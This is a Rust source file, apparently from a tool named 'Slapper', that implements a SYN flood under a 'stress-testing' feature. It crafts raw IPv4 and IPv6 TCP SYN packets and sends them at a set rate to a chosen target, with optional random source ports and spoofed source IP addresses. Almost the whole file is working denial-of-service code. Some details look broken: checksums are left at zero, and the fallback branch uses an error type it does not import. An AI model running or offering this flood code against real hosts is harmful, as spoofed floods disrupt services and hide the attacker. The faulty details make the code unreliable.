#[cfg(all(feature = "stress-testing", unix))]
use crate::error::{Result, SlapperError};
#[cfg(all(feature = "stress-testing", unix))]
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
#[cfg(all(feature = "stress-testing", unix))]
use std::time::{Duration, Instant};

#[cfg(all(feature = "stress-testing", unix))]
use pnet::packet::ip::IpNextHeaderProtocols;
#[cfg(all(feature = "stress-testing", unix))]
use pnet::packet::tcp::TcpFlags;

#[cfg(all(feature = "stress-testing", unix))]
use rand::Rng;

#[cfg(all(feature = "stress-testing", unix))]
use super::metrics::StressMetrics;
#[cfg(all(feature = "stress-testing", unix))]
use super::utils;
#[cfg(all(feature = "stress-testing", unix))]
use super::{StressConfig, StressStats};

#[cfg(all(feature = "stress-testing", unix))]
pub async fn run_syn_flood(config: &StressConfig, metrics: &StressMetrics) -> Result<StressStats> {
    let target_ip = utils::resolve_target(&config.target).await?;
    let target_addr = SocketAddr::new(target_ip, config.port);

    let interface = utils::get_network_interface()?;
    let (mut tx, _rx) = utils::create_channel(&interface, "SYN scan")?;

    metrics.start();

    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration_secs);
    let interval = Duration::from_micros(1_000_000 / config.rate_pps.max(1));

    let mut seq_num: u32 = 1000;
    let mut src_port: u16 = 40000;

    while start_time.elapsed() < duration {
        if config.random_source_port {
            src_port = rand::random::<u16>() % 20000 + 40000;
        } else {
            src_port = src_port.wrapping_add(1);
        }

        let packet = match target_addr.ip() {
            IpAddr::V4(dst_ip) => {
                let src_ip = if config.spoof_source {
                    utils::get_spoofed_source(&config.spoof_range)?
                } else {
                    utils::get_local_ip(&interface)?
                };
                build_syn_packet_v4(src_ip, src_port, dst_ip, target_addr.port(), seq_num)?
            }
            IpAddr::V6(dst_ip) => {
                let src_ip = if config.spoof_source {
                    utils::get_spoofed_source_v6(&config.spoof_range)?
                } else {
                    utils::get_local_ip_v6(&interface)?
                };
                build_syn_packet_v6(src_ip, src_port, dst_ip, target_addr.port(), seq_num)?
            }
        };

        match tx.send_to(&packet, Some(interface.clone())) {
            Some(Ok(_)) => {
                metrics.record_packet(64);
            }
            Some(Err(e)) => {
                tracing::debug!("Send error: {}", e);
                metrics.record_error();
            }
            None => {
                metrics.record_error();
            }
        }

        seq_num = seq_num.wrapping_add(1);

        if interval > Duration::ZERO {
            tokio::time::sleep(interval).await;
        }
    }

    Ok(metrics.to_stats())
}

#[cfg(all(feature = "stress-testing", unix))]
fn build_syn_packet_v4(
    src_ip: Ipv4Addr,
    src_port: u16,
    dst_ip: Ipv4Addr,
    dst_port: u16,
    seq: u32,
) -> Result<Vec<u8>> {
    use pnet_packet::ipv4::MutableIpv4Packet;
    use pnet_packet::tcp::MutableTcpPacket;

    let mut buffer = vec![0u8; 20 + 20];

    let mut ipv4_packet = MutableIpv4Packet::new(&mut buffer[..20])
        .ok_or_else(|| SlapperError::Runtime("Failed to create IPv4 packet".to_string()))?;

    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(40);
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    ipv4_packet.set_source(src_ip);
    ipv4_packet.set_destination(dst_ip);

    let mut tcp_packet = MutableTcpPacket::new(&mut buffer[20..])
        .ok_or_else(|| SlapperError::Runtime("Failed to create TCP packet".to_string()))?;

    tcp_packet.set_source(src_port);
    tcp_packet.set_destination(dst_port);
    tcp_packet.set_sequence(seq);
    tcp_packet.set_acknowledgement(0);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(TcpFlags::SYN);
    tcp_packet.set_window(65535);
    tcp_packet.set_checksum(0);

    Ok(buffer)
}

#[cfg(all(feature = "stress-testing", unix))]
fn build_syn_packet_v6(
    src_ip: Ipv6Addr,
    src_port: u16,
    dst_ip: Ipv6Addr,
    dst_port: u16,
    seq: u32,
) -> Result<Vec<u8>> {
    use pnet_packet::ipv6::MutableIpv6Packet;
    use pnet_packet::tcp::MutableTcpPacket;

    let mut buffer = vec![0u8; 40 + 20];

    let mut ipv6_packet = MutableIpv6Packet::new(&mut buffer[..40])
        .ok_or_else(|| SlapperError::Runtime("Failed to create IPv6 packet".to_string()))?;

    ipv6_packet.set_version(6);
    ipv6_packet.set_payload_length(20);
    ipv6_packet.set_hop_limit(64);
    ipv6_packet.set_next_header(IpNextHeaderProtocols::Tcp);
    ipv6_packet.set_source(src_ip);
    ipv6_packet.set_destination(dst_ip);

    let mut tcp_packet = MutableTcpPacket::new(&mut buffer[40..])
        .ok_or_else(|| SlapperError::Runtime("Failed to create TCP packet".to_string()))?;

    tcp_packet.set_source(src_port);
    tcp_packet.set_destination(dst_port);
    tcp_packet.set_sequence(seq);
    tcp_packet.set_acknowledgement(0);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(TcpFlags::SYN);
    tcp_packet.set_window(65535);
    tcp_packet.set_checksum(0);

    Ok(buffer)
}

#[cfg(not(all(feature = "stress-testing", unix)))]
pub async fn run_syn_flood(
    _config: &super::StressConfig,
    _metrics: &super::metrics::StressMetrics,
) -> crate::error::Result<super::StressStats> {
    Err(SlapperError::Runtime(
        "SYN flood requires Unix and 'stress-testing' feature enabled".to_string(),
    ))
}
